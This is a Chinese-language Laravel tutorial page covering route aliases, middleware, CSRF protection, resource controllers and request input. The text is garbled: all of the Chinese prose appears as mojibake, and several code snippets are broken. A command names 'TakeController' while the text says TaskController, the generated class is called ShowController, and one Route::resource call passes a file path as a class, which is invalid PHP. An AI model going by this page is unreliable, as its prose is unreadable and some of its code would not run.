æ³¨ï¼šåˆ«åçš„å¥½å¤„åœ¨äºï¼Œä»¥ååœ¨æ§åˆ¶å™¨ä¸­ä½¿ç”¨route(<span class="hljs-string">&#x27;åˆ«å&#x27;</span>)çš„æ–¹å¼ç”Ÿæˆurlåï¼Œå³ä¾¿ä¿®æ”¹äº†è·¯ç”±çš„åå­—ï¼Œä¹Ÿä¸ç”¨å†ä¿®æ”¹æ§åˆ¶å™¨ç¨‹åºï¼Œå› ä¸ºé€šè¿‡åˆ«åç¨‹åºèƒ½è‡ªåŠ¨ç”Ÿæˆä¿®æ”¹åçš„url<br></code></pre></div></td></tr></table></figure><p>å…·ä½“è¿˜æœ‰<code>è·¯ç”±è·¯å¾„å‰ç¼€</code>, <code>å­åŸŸåè·¯ç”±</code>,<code>å­å‘½åç©ºé—´</code>,<code>è·¯ç”±å‘½åå‰ç¼€</code>ã€‚å¯ä»¥çœ‹çœ‹laravelå®˜æ–¹æ‰‹å†Œ</p><h2 id="ä¸­é—´ä»¶"><a href="#ä¸­é—´ä»¶" class="headerlink" title="ä¸­é—´ä»¶"></a>ä¸­é—´ä»¶</h2><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>ä¸­é—´ä»¶ä¸ºè¿‡æ»¤è¿›å…¥åº”ç”¨çš„ HTTP è¯·æ±‚æä¾›äº†ä¸€å¥—ä¾¿åˆ©çš„æœºåˆ¶ã€‚ä¾‹å¦‚ï¼ŒLaravel å†…ç½®äº†ä¸€ä¸ªä¸­é—´ä»¶æ¥éªŒè¯ç”¨æˆ·æ˜¯å¦ç»è¿‡è®¤è¯ï¼ˆå¦‚ç™»å½•ï¼‰ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç»è¿‡è®¤è¯ï¼Œä¸­é—´ä»¶ä¼šå°†ç”¨æˆ·é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼Œè€Œå¦‚æœç”¨æˆ·å·²ç»ç»è¿‡è®¤è¯ï¼Œä¸­é—´ä»¶å°±ä¼šå…è®¸è¯·æ±‚ç»§ç»­å¾€å‰è¿›å…¥ä¸‹ä¸€æ­¥æ“ä½œã€‚</p><p>å½“ç„¶ï¼Œé™¤äº†è®¤è¯ä¹‹å¤–ï¼Œä¸­é—´ä»¶è¿˜å¯ä»¥è¢«ç”¨æ¥å¤„ç†å¾ˆå¤šå…¶å®ƒä»»åŠ¡ã€‚æ¯”å¦‚ï¼šCORS ä¸­é—´ä»¶å¯ä»¥ç”¨äºä¸ºç¦»å¼€ç«™ç‚¹çš„å“åº”æ·»åŠ åˆé€‚çš„å¤´ï¼ˆè·¨åŸŸï¼‰ï¼›æ—¥å¿—ä¸­é—´ä»¶å¯ä»¥è®°å½•æ‰€æœ‰è¿›å…¥ç«™ç‚¹çš„è¯·æ±‚ï¼Œä»è€Œæ–¹ä¾¿æˆ‘ä»¬æ„å»ºç³»ç»Ÿæ—¥å¿—ç³»ç»Ÿã€‚</p><p>Laravel æ¡†æ¶è‡ªå¸¦äº†ä¸€äº›ä¸­é—´ä»¶ï¼ŒåŒ…æ‹¬è®¤è¯ã€CSRF ä¿æŠ¤ä¸­é—´ä»¶ç­‰ç­‰ã€‚æ‰€æœ‰çš„ä¸­é—´ä»¶éƒ½ä½äº <code>app/Http/Middleware</code> ç›®å½•ä¸‹ã€‚</p><h4 id="å®šä¹‰ä¸­é—´ä»¶"><a href="#å®šä¹‰ä¸­é—´ä»¶" class="headerlink" title="å®šä¹‰ä¸­é—´ä»¶"></a>å®šä¹‰ä¸­é—´ä»¶</h4><p>è¿™ä¸ªå‘½ä»¤ä¼šåœ¨ <code>app/Http/Middleware</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„ä¸­é—´ä»¶ç±» <code>CheckAge</code>ï¼Œåœ¨è¿™ä¸ªä¸­é—´ä»¶ä¸­ï¼Œæˆ‘ä»¬åªå…è®¸æä¾›çš„ <code>age</code> å¤§äº 200 çš„è¯·æ±‚æ‰èƒ½è®¿é—®åº”ç”¨è¯¥ä¸­é—´ä»¶çš„è·¯ç”±ï¼Œå¦åˆ™ï¼Œæˆ‘ä»¬ä¼šå°†ç”¨æˆ·é‡å®šå‘åˆ° <code>/</code> URIï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Middleware</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Closure</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckAge</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Handle an incoming request.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Http\Request  $request</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Closure  $next</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params"><span class="hljs-variable">$request</span>, <span class="hljs-built_in">Closure</span> <span class="hljs-variable">$next</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request</span>-&gt;age &lt;= <span class="hljs-number">200</span>) &#123;<br>            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$next</span>(<span class="hljs-variable">$request</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æ­£å¦‚ä½ æ‰€çœ‹åˆ°çš„ï¼Œå¦‚æœè¯·æ±‚å‚æ•°ä¸­çš„ <code>age</code> å°äºç­‰äº 200ï¼Œä¸­é—´ä»¶ä¼šè¿”å›ä¸€ä¸ª HTTP é‡å®šå‘ç»™å®¢æˆ·ç«¯ï¼›å¦åˆ™ï¼Œè¯·æ±‚ä¼šè¢«ä¼ é€’ä¸‹å»ã€‚å°†è¯·æ±‚å¾€ä¸‹ä¼ é€’å¯ä»¥é€šè¿‡è°ƒç”¨å›è°ƒå‡½æ•° <code>$next</code> å¹¶ä¼ å…¥å½“å‰ <code>$request</code>ã€‚</p><p>ç†è§£ä¸­é—´ä»¶çš„æœ€å¥½æ–¹å¼å°±æ˜¯å°†ä¸­é—´ä»¶çœ‹åš HTTP è¯·æ±‚åˆ°è¾¾ç›®æ ‡åŠ¨ä½œä¹‹å‰å¿…é¡»ç»è¿‡çš„â€œå±‚â€ï¼Œæ¯ä¸€å±‚éƒ½ä¼šæ£€æŸ¥è¯·æ±‚å¹¶ä¸”å¯ä»¥å®Œå…¨æ‹’ç»å®ƒã€‚æ‰€æœ‰çš„ä¸­é—´éƒ½æ˜¯åœ¨<a href="https://laravelacademy.org/post/21965">æœåŠ¡å®¹å™¨</a>ä¸­è§£æï¼Œæ‰€ä»¥ä½ å¯ä»¥åœ¨ä¸­é—´ä»¶çš„æ„é€ å‡½æ•°ä¸­ç±»å‹æç¤ºä»»ä½•ä¾èµ–ã€‚</p><p>å…·ä½“è¿˜æœ‰<code>è¯·æ±‚ä¹‹å‰/ä¹‹åçš„ä¸­é—´ä»¶</code>,<code>æ³¨å†Œä¸­é—´ä»¶</code>,<code>ä¸­é—´ä»¶å‚æ•°</code>ç­‰ã€‚</p><h2 id="CSRFé˜²æŠ¤"><a href="#CSRFé˜²æŠ¤" class="headerlink" title="CSRFé˜²æŠ¤"></a>CSRFé˜²æŠ¤</h2><p>ç®€å•åœ°è¯´ï¼Œcsrfå°±æ˜¯æ”»å‡»è€…ä¼ªè£…ç”¨æˆ·æ¥æ”»å‡»æˆä¿¡ç½‘ç«™ã€‚</p><p>åœ¨laravelä¸­é˜²æŠ¤csrfç”¨çš„æ—¶csrfä»¤ç‰Œï¼Œå…¶å®å°±æ˜¯ç”¨tokenæˆ–è€…cookieæ¥éªŒè¯è¯·æ±‚è¾“å…¥çš„ token å€¼å’Œ Session ä¸­å­˜å‚¨çš„ token æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœæ²¡æœ‰ä¼ é€’è¯¥å­—æ®µæˆ–è€…ä¼ é€’è¿‡æ¥çš„å­—æ®µå€¼å’Œ Session ä¸­å­˜å‚¨çš„æ•°å€¼ä¸ä¸€è‡´ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><h2 id="æ§åˆ¶å™¨å…¥é—¨"><a href="#æ§åˆ¶å™¨å…¥é—¨" class="headerlink" title="æ§åˆ¶å™¨å…¥é—¨"></a>æ§åˆ¶å™¨å…¥é—¨</h2><p>å¯ä»¥é€šè¿‡artisanå‘½ä»¤å¿«é€Ÿåˆ›å»ºä¸€ä¸ªæ§åˆ¶å™¨</p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss">php artisan <span class="hljs-built_in">make</span>:controller TakeController<br></code></pre></div></td></tr></table></figure><p>è¯¥å‘½ä»¤ä¼šåœ¨ <code>app/Http/Controllers</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–°çš„åä¸º <code>TaskController.php</code> çš„æ–‡ä»¶ï¼Œé»˜è®¤ç”Ÿæˆçš„æ§åˆ¶å™¨ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Controllers</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShowController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//è¯¥æ–¹æ³•ç”¨äºå°† user å˜é‡æ¸²æŸ“åˆ° user/profile è§†å›¾ä¸­ã€‚ç„¶ååœ¨ user ç›®å½•ä¸‹æ–°å»º profile.blade.php æ–‡ä»¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params">User <span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> view(<span class="hljs-string">&#x27;user.profile&#x27;</span>, [<span class="hljs-string">&#x27;user&#x27;</span> =&gt; <span class="hljs-variable">$user</span>]); <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="å•ä¸€åŠ¨ä½œæ§åˆ¶å™¨"><a href="#å•ä¸€åŠ¨ä½œæ§åˆ¶å™¨" class="headerlink" title="å•ä¸€åŠ¨ä½œæ§åˆ¶å™¨"></a>å•ä¸€åŠ¨ä½œæ§åˆ¶å™¨</h4><p>ç”¨<code>__invoke</code> æ–¹æ³•ï¼š</p><p>ä¾‹å¦‚å¯åœ¨ä¸Šè¿°ç±»ä¸­å®šä¹‰</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> view(<span class="hljs-string">&#x27;user.profile&#x27;</span>, [<span class="hljs-string">&#x27;user&#x27;</span> =&gt; User::findOrFail(<span class="hljs-variable">$id</span>)]);<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>å½“ä½ ä¸ºè¿™ä¸ªå•åŠ¨ä½œæ§åˆ¶å™¨æ³¨å†Œè·¯ç”±çš„æ—¶å€™ï¼Œä¸éœ€è¦æŒ‡å®šæ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;user/&#123;user&#125;&#x27;</span>, \App\Http\Controllers\ShowController::class);<br></code></pre></div></td></tr></table></figure><h4 id="æ§åˆ¶å™¨ä¸­é—´ä»¶"><a href="#æ§åˆ¶å™¨ä¸­é—´ä»¶" class="headerlink" title="æ§åˆ¶å™¨ä¸­é—´ä»¶"></a>æ§åˆ¶å™¨ä¸­é—´ä»¶</h4><p><code>Route::get(&#39;profile&#39;, [UserController::class, &#39;show&#39;])-&gt;middleware(&#39;auth&#39;);</code></p><p>ä¸è¿‡ï¼Œåœ¨æ§åˆ¶å™¨çš„æ„é€ å‡½æ•°ä¸­è®¾ç½®ä¸­é—´ä»¶æ›´æ–¹ä¾¿ï¼Œä½ å¯ä»¥ä½¿ç”¨åŸºç±»æä¾›çš„ <code>middleware</code> æ–¹æ³•è½»æ¾åˆ†é…ä¸­é—´ä»¶ç»™è¯¥æ§åˆ¶å™¨çš„åŠ¨ä½œï¼Œä½ ç”šè‡³å¯ä»¥é™åˆ¶ä¸­é—´ä»¶åªåº”ç”¨åˆ°è¯¥æ§åˆ¶å™¨ç±»çš„æŒ‡å®šæ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">&#x27;auth&#x27;</span>); <span class="hljs-comment">// auth ä¸­é—´ä»¶ä¼šåº”ç”¨åˆ°æ‰€æœ‰æ–¹æ³• </span><br>        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">&#x27;log&#x27;</span>)-&gt;only(<span class="hljs-string">&#x27;index&#x27;</span>); <span class="hljs-comment">// log ä¸­é—´ä»¶åªä¼šåº”ç”¨åˆ° index æ–¹æ³•</span><br>        <span class="hljs-keyword">$this</span>-&gt;middleware(<span class="hljs-string">&#x27;subscribed&#x27;</span>)-&gt;except(<span class="hljs-string">&#x27;store&#x27;</span>); <span class="hljs-comment">// subscribed ä¸­é—´ä»¶ä¼šåº”ç”¨åˆ° store ä¹‹å¤–çš„æ‰€æœ‰æ–¹æ³•</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="èµ„æºæ§åˆ¶å™¨"><a href="#èµ„æºæ§åˆ¶å™¨" class="headerlink" title="èµ„æºæ§åˆ¶å™¨"></a>èµ„æºæ§åˆ¶å™¨</h4><p>å‘½ä»¤åˆ›å»º</p><p><code>php artisan make:controller PostController --resource</code></p><p>è¯¥ Artisan å‘½ä»¤å°†ä¼šç”Ÿæˆä¸€ä¸ªæ§åˆ¶å™¨æ–‡ä»¶ <code>app/Http/Controllers/PostController.php</code>ï¼Œè¿™ä¸ªæ§åˆ¶å™¨åŒ…å«äº†æ¯ä¸€ä¸ªèµ„æºæ“ä½œå¯¹åº”çš„æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Controllers</span>;<br>    <br><span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Request</span>;<br>    <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PostController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Display a listing of the resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Show the form for creating a new resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Store a newly created resource in storage.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Http\Request  $request</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">store</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Display the specified resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Show the form for editing the specified resource.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">edit</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Update the specified resource in storage.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  \Illuminate\Http\Request  $request</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span>, <span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Remove the specified resource from storage.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  int  $id</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> \Illuminate\Http\Response</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">destroy</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç„¶ååˆ›å»ºè·¯ç”±</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::resource(<span class="hljs-string">&#x27;post&#x27;</span>,app/Http/Controllers/PostController.php::class);<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210705124752719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="è·å–ç”¨æˆ·è¾“å…¥"><a href="#è·å–ç”¨æˆ·è¾“å…¥" class="headerlink" title="è·å–ç”¨æˆ·è¾“å…¥"></a>è·å–ç”¨æˆ·è¾“å…¥</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">Route::get(<span class="hljs-string">&#x27;task/create&#x27;</span>, <span class="hljs-string">&#x27;TaskController@create&#x27;</span>);<br>Route::post(<span class="hljs-string">&#x27;task&#x27;</span>, <span class="hljs-string">&#x27;TaskController@store&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åœ¨<code>TaskController.php</code>ä¸­åˆ›å»ºcreateæ–¹æ³•æ»¡è¶³æˆ‘ä»¬çš„åŠŸèƒ½</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">store</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$task</span> = <span class="hljs-keyword">new</span> Task();<br>    <span class="hljs-variable">$task</span>-&gt;title = <span class="hljs-variable">$request</span>-&gt;input(<span class="hljs-string">&#x27;title&#x27;</span>);<br>    <span class="hljs-variable">$task</span>-&gt;description = <span class="hljs-variable">$request</span>-&gt;input(<span class="hljs-string">&#x27;description&#x27;</span>);<br>    <span class="hljs-variable">$task</span>-&gt;save();<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;task&#x27;</span>);   <span class="hljs-comment">// é‡å®šå‘åˆ° GET task è·¯ç”±</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>åé¢è¿˜å¯ä»¥ç”¨é—¨é¢æ¥è·å–<code>input</code>.</p><h2 id="è¯·æ±‚"><a href="#è¯·æ±‚" class="headerlink" title="è¯·æ±‚"></a>è¯·æ±‚</h2><h4 id="è®¿é—®è¯·æ±‚å®ä¾‹"><a href="#è®¿é—®è¯·æ±‚å®ä¾‹" class="headerlink" title="è®¿é—®è¯·æ±‚å®ä¾‹"></a>è®¿é—®è¯·æ±‚å®ä¾‹</h4><p>åœ¨æ§åˆ¶å™¨ä¸­è·å–å½“å‰ HTTP è¯·æ±‚å®ä¾‹ï¼Œéœ€è¦åœ¨æ„é€ å‡½æ•°æˆ–æ–¹æ³•ä¸­å¯¹ <code>Illuminate\Http\Request</code> ç±»è¿›è¡Œä¾èµ–æ³¨å…¥ï¼Œè¿™æ ·å½“å‰è¯·æ±‚å®ä¾‹ä¼šè¢«<a href="https://laravelacademy.org/post/21965">æœåŠ¡å®¹å™¨</a>è‡ªåŠ¨æ³¨å…¥ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210705132809918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="ä¾èµ–æ³¨å…¥-amp-è·¯ç”±å‚æ•°"><a href="#ä¾èµ–æ³¨å…¥-amp-è·¯ç”±å‚æ•°" class="headerlink" title="ä¾èµ–æ³¨å…¥ &amp; è·¯ç”±å‚æ•°"></a>ä¾èµ–æ³¨å…¥ &amp; è·¯ç”±å‚æ•°</h4><p>å¦‚æœè¿˜æœŸæœ›åœ¨æ§åˆ¶å™¨æ–¹æ³•ä¸­è·å–è·¯ç”±å‚æ•°ï¼Œåªéœ€è¦å°†è·¯ç”±å‚æ•°ç½®äºå…¶å®ƒä¾èµ–ä¹‹åå³å¯ï¼Œä¾‹å¦‚ï¼Œå¦‚æœä½ çš„è·¯ç”±å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> App\Http\Controllers\UserController;<br><br>Route::put(<span class="hljs-string">&#x27;user/&#123;id&#125;&#x27;</span>, [UserController::class, <span class="hljs-string">&#x27;update&#x27;</span>]);<br></code></pre></div></td></tr></table></figure><p>ä»ç„¶å¯ä»¥å¯¹ <code>Illuminate\Http\Request</code> 